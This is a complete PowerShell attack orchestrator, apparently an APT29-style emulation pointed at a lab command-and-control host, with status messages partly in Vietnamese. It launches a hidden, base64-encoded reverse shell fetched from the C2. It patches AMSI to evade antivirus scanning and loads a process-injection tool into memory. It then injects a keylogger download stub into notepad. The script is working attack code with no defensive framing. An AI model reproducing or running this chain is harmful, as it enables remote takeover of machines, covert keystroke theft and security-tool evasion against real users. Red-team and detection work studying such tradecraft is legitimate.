Set-ExecutionPolicy Bypass -Scope Process -Force -EA SilentlyContinue

$PublicDir = "C:\Users\Public\apt29"
mkdir $PublicDir -Force -EA SilentlyContinue
$LogFile = "$PublicDir\orchestrator.log"
function L($m) { "[$(Get-Date -Format 'HH:mm:ss')] $m" | Out-File $LogFile -Append }

$C2 = "http://192.168.56.100:8000"

L "========================================"
L "ORCHESTRATOR START"
L "========================================"
L "PID: $PID"
L "User: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"

# ===== 1: Revshell =====
L "[1] Start revshell..."
try {
    $revPayload = "IEX(New-Object Net.WebClient).DownloadString('$C2/revshell.ps1')"
    $revB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($revPayload))
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoP","-Exec","Bypass","-Enc",$revB64
    L "  Revshell spawned"
} catch {
    L "  Revshell FAIL: $_"
}

# ===== 2: Chờ notepad =====
L "[2] Chờ notepad.exe..."
$notepad = $null
for ($i = 0; $i -lt 30; $i++) {
    $notepad = Get-Process notepad -EA SilentlyContinue | Select-Object -First 1
    if ($notepad) { break }
    Start-Sleep -Milliseconds 500
}

if (-not $notepad) {
    L "[!] Không tìm thấy notepad sau 15s. Exit."
    return
}
L "  Notepad PID: $($notepad.Id)"

# ===== 3: Load Invoke-PSInject vào memory =====
L "[3] Load Invoke-PSInject vào memory..."

try {
    $amsiBypass = @'
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$h=$g;[System.Runtime.InteropServices.Marshal]::WriteInt32($h,0)
'@
    Invoke-Expression $amsiBypass
    L "  AMSI bypass OK"
} catch {
    L "  AMSI bypass FAIL"
}

try {
    $toolCode = (New-Object Net.WebClient).DownloadString("$C2/Invoke-PSInject.ps1")
    L "  Downloaded to memory: $($toolCode.Length) chars"
} catch {
    L "  Download FAIL: $_"
    return
}

try {
    Invoke-Expression $toolCode
    L "  Tool loaded OK (in-memory)"
} catch {
    L "  Load FAIL: $_"
    return
}

# ===== 4: Tạo stub =====
L "[4] Tạo stub keylogger"
$Stub = "IEX(New-Object Net.WebClient).DownloadString('$C2/keylogger.ps1')"
$StubB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Stub))
L "  Stub B64 length: $($StubB64.Length)"

if ($StubB64.Length -gt 1200) {
    L "  Stub quá dài!"
    return
}

# ===== 5: Inject =====
L "[5] Inject vào notepad PID $($notepad.Id)"
try {
    Invoke-PSInject -ProcId $notepad.Id -PoshCode $StubB64
    L "  INJECT OK"
} catch {
    L "  INJECT FAIL: $_"
    return
}

# ===== 6: Verify =====
Start-Sleep 3
$alive = [bool](Get-Process -Id $notepad.Id -EA SilentlyContinue)
L "[6] Notepad alive: $alive"

L "========================================"
L "ORCHESTRATOR END"
L "========================================"
